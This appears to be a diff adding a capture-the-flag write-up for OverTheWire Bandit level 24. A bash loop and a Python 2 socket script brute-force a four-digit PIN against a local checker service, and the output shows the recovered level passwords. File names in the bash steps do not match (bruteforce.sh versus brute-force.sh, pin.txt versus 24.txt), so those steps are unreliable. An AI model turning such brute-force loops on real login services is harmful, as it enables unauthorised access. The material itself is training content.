@@ -1,0 +1,61 @@
+bandit24@bandit:~$ ncat localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+^C
+bandit24@bandit:~$ cd /tmp/brute
+-bash: cd: /tmp/brute: No such file or directory
+bandit24@bandit:~$ mkdir /tmp/brute                                                                                                                          
+bandit24@bandit:~$ cd /tmp/brute                                                                                                                             
+bandit24@bandit:/tmp/brute$ ls
+bandit24@bandit:/tmp/brute$ nano bruteforce.sh
+Unable to create directory /home/bandit24/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+for i in {1..10000}
+
+do 
+
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> ./pin.txt
+
+done
+
+chmod 700 ./brute-force.sh
+
+./brute-force.sh
+
+cat 24.txt | nc localhost 30002
+
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+Python Program
+
+
+import socket
+
+pin = 0
+
+password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('localhost', 30002))
+
+s.recv(1024)
+
+while True:
+
+    print '[+] Sending Pin: ' + str(pin)
+    s.sendall(password + str(pin) + '\n')
+    data = s.recv(1024)
+    print data
+    pin += 1
+    
+    
+    [+] Sending Pin: 2102
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
